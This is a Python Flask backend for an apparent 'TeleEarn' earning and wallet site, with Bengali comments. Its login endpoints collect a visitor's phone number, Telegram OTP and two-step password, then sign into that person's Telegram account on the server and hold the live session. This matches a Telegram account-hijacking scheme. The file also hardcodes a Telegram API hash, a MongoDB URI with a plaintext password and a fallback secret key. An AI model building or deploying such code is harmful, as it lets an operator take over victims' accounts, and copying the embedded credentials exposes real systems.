import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# ১. সিস্টেম ফিক্স (Render-এ Asyncio চালানোর জন্য জরুরি)
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_super_secret_key_123")

# ২. CORS ফিক্স (ব্রাউজার থেকে ওটিপি রিকোয়েস্ট পাঠানোর বাধা দূর করবে)
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# ৩. আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ৪. ডাটাবেস কানেকশন
try:
    client_db = MongoClient(MONGO_URI)
    db = client_db['AAF_TeleEarn']
    users_col = db['users']
except Exception as e:
    print(f"Database Error: {e}")

# সেশন স্টোর করার জন্য
temp_clients = {}

# ---------------- ৫. HTML রাউটস ----------------

@app.route('/')
@app.route('/login')
def login(): return render_template('login.html')

@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/task')
def task(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('treading.html')

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/admin')
def admin_page(): return render_template('admin.html')

# ---------------- ৬. ওটিপি পাঠানোর কোড (OTP SEND CODE) ----------------

@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"success": False, "message": "Phone number missing"})

    try:
        # StringSession ব্যবহার করা হয়েছে যাতে রেন্ডার সার্ভারে ফাইল এরর না আসে
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # ওটিপি রিকোয়েস্ট পাঠানো হচ্ছে
        result = await client.send_code_request(phone)
        
        # ক্লায়েন্ট অবজেক্ট এবং হ্যাশ সেভ করে রাখা হচ্ছে পরবর্তী ধাপের জন্য
        temp_clients[phone] = {
            "client": client,
            "hash": result.phone_code_hash
        }
        
        print(f"Success: OTP sent to {phone}")
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
        
    except Exception as e:
        print(f"OTP Send Error: {str(e)}")
        return jsonify({"success": False, "message": str(e)})

# ---------------- ৭. ওটিপি ভেরিফাই এবং লগইন ----------------

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    two_step = data.get('password') # ২-স্টেপ পাসওয়ার্ড যদি থাকে

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session expired"})

    try:
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        # টেলিগ্রামে সাইন-ইন
        user = await client.sign_in(phone, code, phone_code_hash=h, password=two_step)
        
        user_data = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "joined": datetime.utcnow()
        }
        
        # ডাটাবেসে ইউজার সেভ (নতুন হলে ০ ব্যালেন্স)
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": user_data, "$setOnInsert": {"main_balance": 0}},
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})
        
    except Exception as e:
        print(f"Login Error: {str(e)}")
        return jsonify({"success": False, "message": str(e)})

# ---------------- ৮. পোর্ট সেটিংস ----------------

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
